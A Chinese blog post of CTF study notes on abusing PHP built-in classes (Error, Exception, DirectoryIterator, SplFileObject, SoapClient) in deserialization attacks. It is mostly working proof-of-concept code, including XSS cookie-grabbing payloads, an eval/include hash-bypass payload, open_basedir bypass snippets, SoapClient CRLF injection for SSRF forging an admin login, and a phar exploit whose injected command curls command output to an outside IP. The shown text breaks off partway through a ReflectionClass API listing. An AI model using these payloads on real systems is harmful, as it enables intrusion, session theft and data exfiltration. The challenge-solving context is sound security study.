<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>php原生类学习 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">php原生类学习</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">2022-11-20</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h1 id="查看各方法内置类"><a href="#查看各方法内置类" class="headerlink" title="查看各方法内置类"></a>查看各方法内置类</h1><p> 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  </p>
<pre><code class="php">&lt;?php
$classes = get_declared_classes();
foreach ($classes as $class) &#123;
    $methods = get_class_methods($class);
    foreach ($methods as $method) &#123;
        if (in_array($method, array(
            &#39;__destruct&#39;,
            &#39;__toString&#39;,
            &#39;__wakeup&#39;,
            &#39;__call&#39;,
            &#39;__callStatic&#39;,
            &#39;__get&#39;,
            &#39;__set&#39;,
            &#39;__isset&#39;,
            &#39;__unset&#39;,
            &#39;__invoke&#39;,
            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
        ))) &#123;
            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p>
<h1 id="利用Error-Exception内置类进行XSS"><a href="#利用Error-Exception内置类进行XSS" class="headerlink" title="利用Error/Exception内置类进行XSS"></a>利用Error/Exception内置类进行XSS</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p>利用条件:<br>php7以上<br>开启报错情况下<br> Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo $l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。<br> 本地创建error.php(php版本设置为7.0)  </p>
<pre><code class="php">&lt;?php
highlight_file(&#39;2.php&#39;);
$a = unserialize($_GET[&#39;cmd&#39;]);
echo $a;
?&gt; 
</code></pre>
<p> 这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类<br>poc:</p>
<pre><code class="php">&lt;?php    
$a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);
$b = serialize($a);
echo urlencode($b);  ?&gt;
</code></pre>
<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p>
<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>利用条件:<br>php5、php7<br>开启报错的情况下</p>
<pre><code class="php">&lt;?php
header(&quot;Content-Type:text/html;charset=utf-8&quot;);
highlight_file(__FILE__);
$a = unserialize($_GET[&#39;cmd&#39;]);
echo $a;
?&gt;
</code></pre>
<p>poc:</p>
<pre><code class="php">&lt;?php
$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);
$b = serialize($a);
echo urlencode($b);  ?&gt;
</code></pre>
<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p>
<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a><strong>[BJDCTF 2nd]xss之光</strong></h2><p> 通过git拿到源码  </p>
<pre><code class="php">&lt;?php 
$a = $_GET[&#39;yds_is_so_beautiful&#39;];
Echo unserialize($a);
</code></pre>
<p> 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。<br> 思路：flag一般在COOKIE的信息里。<br>poc:</p>
<pre><code class="php">&lt;?php
$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);
Echo urlencode(serialize($poc));?&gt;
反弹cookie
</code></pre>
<p> 将得到的结果传入<br>/?yds_is_so_beautiful=$POC  </p>
<h1 id="利用Error-Exception-内置类绕过哈希比较"><a href="#利用Error-Exception-内置类绕过哈希比较" class="headerlink" title="利用Error/Exception 内置类绕过哈希比较"></a>利用Error/Exception 内置类绕过哈希比较</h1><p> 测试代码  :</p>
<pre><code class="php">&lt;?php
$a = new Error(&quot;payload&quot;,1);
echo $a;
</code></pre>
<p> 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。  </p>
<pre><code class="php">&lt;?php
$a = new Error(&quot;payload&quot;,1);
$b = new Error(&quot;payload&quot;,2);
echo $a;
echo &quot;\r\n\r\n&quot;;
echo $b;
</code></pre>
<p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。<br>可以利用这个方法果然哈希比较。  </p>
<h2 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a><strong>[2020 极客大挑战]Greatphp</strong></h2><p> 考点：php内置绕过哈希比较、php取反绕过  </p>
<pre><code class="php">&lt;?php
error_reporting(0);
class SYCLOVER &#123;
    public $syc;
    public $lover;

    public function __wakeup()&#123;
        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;
           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;
               eval($this-&gt;syc);
           &#125; else &#123;
               die(&quot;Try Hard !!&quot;);
           &#125;
           
        &#125;
    &#125;
&#125;
if (isset($_GET[&#39;great&#39;]))&#123;
    unserialize($_GET[&#39;great&#39;]);
&#125; else &#123;
    highlight_file(__FILE__);
&#125;
?&gt;
</code></pre>
<p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p>
<pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))
</code></pre>
<p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="image.png"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p>
<pre><code class="php">&lt;?php
class SYCLOVER &#123;
    public $syc;
    public $lover;
&#125;
//$cmd = &quot;flag.php&quot;;
//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F
$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;
//print $str;
echo &quot;\r\n\r\n&quot;;
$c = new SYCLOVER();
$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);
echo urlencode(serialize($c));
?&gt;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="image.png"><br>这里其实有一个地方要注意:</p>
<pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;
</code></pre>
<p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="image.png"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p>
<pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)
</code></pre>
<p>这样实际上是不影响语句的执行</p>
<h1 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">版本：php5、php7、php8
Filesystemlterator
版本：PHP 5 &gt;= 5.3.0, PHP 7, PHP 8
</code></pre>
<pre><code class="php">&lt;?php 
highlight_file(__file__); 
$dir=$_GET[&#39;cmd&#39;]; 
$a=new DirectoryIterator($dir); 
foreach($a as $f)&#123; 
    echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;); 
     
&#125; 
?&gt; 
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="image.png"><br> 查看该类，发现__toString()方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="image.png"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p>
<h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p>
<pre><code class="php">&lt;?php
$dir=new FilesystemIterator(&quot;/&quot;);
echo $dir;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="image.png"><br>遍历一下</p>
<pre><code class="php">&lt;?php
$dir=new FilesystemIterator(&quot;/&quot;);
echo $dir;
foreach($dir as $tmp)&#123;
    echo($tmp.&#39;&lt;br&gt;&#39;);
    echo &quot;\n&quot;;
&#125;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="image.png"></p>
<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="image.png"></p>
<pre><code class="php">    &lt;?php
    $dir=new SplFileObject(&quot;flag.php&quot;);
    echo $dir;
    ?&gt;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="image.png"><br> 对文件中的每一行内容进行遍历：  </p>
<pre><code class="php">&lt;?php
$dir = new SplFileObject(&quot;flag.php&quot;);
foreach($dir as $tmp)&#123;
    echo ($tmp.&#39;&lt;br&gt;&#39;);
&#125;
?&gt;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="image.png"><br>出题的时候如果看到形如:</p>
<pre><code class="php">    echo new $this-&gt;key($this-&gt;value);
 
 
    $this -&gt; a = new $this-&gt;key($this-&gt;value);
    echo $this-&gt;a;
</code></pre>
<p> 只需要让**$this-&gt;key<strong>值赋为我们想用原生函数，</strong>$this-&gt;value**赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的一个文件。  </p>
<pre><code class="php">&lt;?php
class HY&#123;
    public $a;
    public $b;
&#125;
$c = new HY();
$c-&gt;a=&quot;SplFileObject&quot;;
$c-&gt;b=&quot;flag.php&quot;;
echo new $c-&gt;a($c-&gt;b);
?&gt;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="image.png"></p>
<h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p>
<pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;display_errors&#39;, 0); // 你们在炫技吗？
if(isset($_POST[&#39;c&#39;]))&#123;
    $c=$_POST[&#39;c&#39;];
    eval($c);
    $s=ob_get_contents();
    ob_end_clean();
    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);
&#125;else&#123;
    highlight_file(__FILE__); &#125; ?&gt;
?&gt;
</code></pre>
<p>首先介绍一下ob_get_contents()和ob_end_clean这两个函数。<br>缓冲区(Buffer)就是在内存中预留指定大小的存储空间用来对I/O的数据做临时存储，这部分预留的内存空间叫缓冲区。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>ob_get_contents:返回输出缓冲区的内容，只是得到缓冲区的内容，但不清除它。<br>ob_end_clean:清空（擦除）缓冲区并关闭输出缓冲。<br>eval执行我们的命令后，输出flag内容，但是输出要经过缓冲区，对输出数据进行缓存，通过ob_get_contents() 原来的数据赋值给了$s，然后又用ob_end_clean将缓冲区清空了，那么eval就没办法输出了（缓冲区都被清空了），所以就只有$s一个输出了。所以这里可以通过exit()或者die() （exit别名）退出，这样的话就没有ob_end_clean这个缓冲区清空操作，输出就能正常输出。<br><strong>构造payload:</strong></p>
<pre><code class="php">c=?&gt;&lt;?php
$a=new DirectoryIterator(&quot;glob:///*&quot;);
foreach($a as $f)
&#123;echo($f-&gt;__toString().&#39; &#39;);
&#125; 
exit(0);
?&gt;
</code></pre>
<p>然后读取文件</p>
<pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();
</code></pre>
<h1 id="利用SoapClient类进行CRLF-SSRF"><a href="#利用SoapClient类进行CRLF-SSRF" class="headerlink" title="利用SoapClient类进行CRLF+SSRF"></a>利用SoapClient类进行CRLF+SSRF</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p>
<pre><code class="php">SoapClient &#123;
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;
</code></pre>
<p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p>
<pre><code class="php">函数形式：
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
wsdl，就是一个xml格式的文档，用于描述Web Server的定义
第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
</code></pre>
<p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p>
<pre><code class="php">&lt;?php
$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;not_exists_function();
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="image.png"></p>
<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p>
<pre><code class="php">&lt;?php
$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;not_exists_function();
</code></pre>
<p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="image.png"><br>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p>
<pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :
The user_agent option specifies string to use in User-Agent header.
</code></pre>
<p>user_agent同样可以注入CRLF，控制Content-Type的值</p>
<pre><code class="php">&lt;?php
$target = &#39;http://127.0.0.1:5555/path&#39;;
$post_string = &#39;data=something&#39;;
$headers = array(
    &#39;X-Forwarded-For: 127.0.0.1&#39;,
    &#39;Cookie: PHPSESSID=my_session&#39;
    );
$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
$aaa = serialize($b);
$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
echo $aaa;
$c = unserialize($aaa);
$c-&gt;not_exists_function();
?&gt;
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png" alt="image.png"><br>如上，使用SoapClient<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p>
<h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a target="_blank" rel="noopener" href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="ebd6f7f1404a349ee8e31f27773af628.png"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p>
<pre><code class="php">&lt;?php
$target = &#39;http://127.0.0.1/index.php?action=login&#39;;
$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;
$headers = array(
    &#39;X-Forwarded-For: 127.0.0.1&#39;,
    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;
    );
$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
$aaa = serialize($b);
$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
echo bin2hex($aaa);
?&gt;
</code></pre>
<p> 再使用上面的PHPSESSID访问，就是admin了  </p>
<h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32380857/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p>
<pre><code class="php">&lt;?php
class File&#123;
    public $file_name;
    public $func = &quot;SoapClient&quot;;
    function __construct($file_name)&#123;
        $this-&gt;file_name = $file_name;
    &#125;
&#125;
$target = &#39;http://127.0.0.1/admin.php&#39;;
$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;
$headers = array(
    &#39;X-Forwarded-For: 127.0.0.1&#39;,
);
$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];

@unlink(&quot;phar.phar&quot;);

$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar

$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作

$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //设置stub

$o = new File($f);

$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest

$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件

//签名自动计算

$phar-&gt;stopBuffering();

?&gt;
</code></pre>
<p>详细过程可查看:<a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> 《web刷题》</p>
<h1 id="利用ReflectionMethod读取User类的方法"><a href="#利用ReflectionMethod读取User类的方法" class="headerlink" title="利用ReflectionMethod读取User类的方法"></a>利用ReflectionMethod读取User类的方法</h1><h2 id="ReflectionMethod类"><a href="#ReflectionMethod类" class="headerlink" title="ReflectionMethod类"></a>ReflectionMethod类</h2><p>ReflectionMethod的类报告了方法的相关信息<br>版本：(PHP 5, PHP 7, PHP 8)</p>
<h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);

//print_r(ReflectionClass::export(demo::class));
print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。
var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回null
var_dump($ref-&gt;inNamespace()); // 是否在命名空间中
var_dump($ref-&gt;getConstants()); // 获取所有定义的常量
var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量
print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性
var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回false
var_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数
var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径
var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组
var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组
var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。
var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用
var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间
var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空
var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回false
var_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用
var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间
var_dump($ref-&gt;getStartLine()); // 获取起始行号
print_r($ref-&gt;getStaticProperties()); // 获取静态属性
print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误
